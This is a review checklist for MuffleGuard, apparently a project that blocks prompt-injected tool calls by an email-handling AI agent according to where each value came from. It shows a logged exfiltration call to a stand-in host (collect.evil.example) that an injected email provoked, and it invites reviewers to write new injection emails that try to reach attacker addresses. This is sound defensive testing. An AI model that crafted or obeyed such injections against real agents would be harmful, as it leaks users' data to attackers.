# Reviewing MuffleGuard

A checklist for reviewing this before the deadline. No API key is needed: the
model responses are cached in the repo, so everything below runs offline.

## Setup

```bash
git clone https://github.com/Trafalgar-2006/MuffleGuard
cd MuffleGuard
python -m venv .venv
.venv/Scripts/python -m pip install -r requirements-dev.txt    # Linux/macOS: .venv/bin/python
```

Detector mode needs both classifier snapshots in the local Hugging Face cache;
the code does not download them. To populate the cache once, install the CLI and
download both repositories:

```bash
.venv/Scripts/python -m pip install huggingface_hub
.venv/Scripts/hf download protectai/deberta-v3-base-prompt-injection-v2
.venv/Scripts/hf download Horizon-Labs/prompt-injection-guard-small
```

On Linux or macOS, use `.venv/bin/` in place of `.venv/Scripts/`.

Without both snapshots, `--detector` exits before contacting the model API.
Everything else works without the classifier weights.

## What to run

| # | Command | What should happen |
| --- | --- | --- |
| 1 | `.venv/Scripts/python -m pytest` | 129 passed, well under a minute |
| 2 | `.venv/Scripts/python tools/hero_attack.py --no-muffle` | `GATE: PASS`. Undefended leaks, defended does not |
| 3 | `.venv/Scripts/python tools/hero_attack.py` | Same verdict, but the attack is muffled before the model sees it |
| 4 | `.venv/Scripts/python tools/hero_attack.py --detector` | Same, with both classifiers loaded. Exits early if either is unavailable |

In run 2, the important line is the block reason:

```
BLOCK http_post(url='https://collect.evil.example/u', ...)
      The url 'collect.evil.example' came from email #5 from hr@corp.example, not from you.
```

The model obeyed the attack. Nothing detected it. The call was refused anyway,
because the address was never the user's. That is the whole idea, so if this
line is unclear to you, say so: judges will read it once and move on.

## Where to attack it

The useful attention is here, in rough order of value.

1. **Get data to the attacker.** Edit the attack emails in `sandbox/world.py`,
   or write a new one, and try to make something reach
   `backup@evil.example` or `collect.evil.example` with the guard on. Add it to
   `tests/test_redteam.py` if it works.
2. **Make it refuse honest work.** A guard that blocks real tasks gets switched
   off. Try ordinary requests (reply to a colleague, forward an invoice, post a
   summary somewhere legitimate) and find ones that are wrongly blocked.
3. **Break the block reasons.** Every refusal should name where the value came
   from, in one line, with no jargon. Find ones that are vague or wrong.
4. **Break the audit chain quietly.** `muffleguard/audit.py`. Editing a row
   should be caught at that row.
5. **Read `muffleguard/policy.py`.** It is the heart. If a rule there surprises
   you, that is worth more than a failing test.

## Already known, please do not report as bugs

These are deliberate, and each is written down in the README or asserted in
`tests/test_redteam.py`.

- **An address the user pastes themselves is allowed.** The guard answers "who
  chose this". If the user typed it, they did.
- **URL provenance checks the host name only.** Scheme, port, path, DNS result,
  and redirect destination need separate controls in a real network adapter.
- **"Please ignore my last email" is flagged as an injection.** Thresholds are
  untuned until the evaluation phase. Real false positives found in run 3 or 4
  are still worth reporting, with the text.
- **The egress scan is heuristic.** It blocks recognized secret formats and
  copied runs of at least three meaningful words, not every encoding or
  paraphrase.
- **Detector model files remain a supply-chain input.** BPE merges are checked
  against the known native-loader panic cases, but tokenizer/model files are not
  pinned to immutable revisions or checked against signed hashes.
- **The model provider sees request and tool-result text.** The guard controls
  tool actions; it does not prevent data from being sent to the configured
  provider. The demo opts into a local response cache for synthetic data; keep
  real user data out of that cache and out of Git.
- **The tools use an in-memory fake world.** Replacing a fake tool with real
  mail, file or HTTP access needs separate authorization and SSRF protections.
- **The audit log is tamper-evident, not tamper-proof.** Its recorded head
  detects row deletion while intact. Anyone who can rewrite the database can
  alter both chain and head; that needs an external checkpoint or signing key.
- **Persistent audit logs can contain identifying metadata.** They omit full
  tool results and muffled content, but reason text and source labels may include
  recipients or file names. Restrict access and set retention.
- **An unknown recipient asks rather than blocks.** Unattended runs deny by
  default, so nothing is sent without a person.
- **Detectors take 129-830 ms per email.** Being measured properly later. The
  policy engine, which does the blocking, is microseconds.

## Reporting

For anything you find, please give: the command, what you expected, what
happened, and the smallest input that shows it. If it is a bypass, a failing
test in `tests/test_redteam.py` is the most useful form.

Say which of the four runs you actually completed, including any that failed to
start. A step that did not run is more useful to know about than a step that
passed.
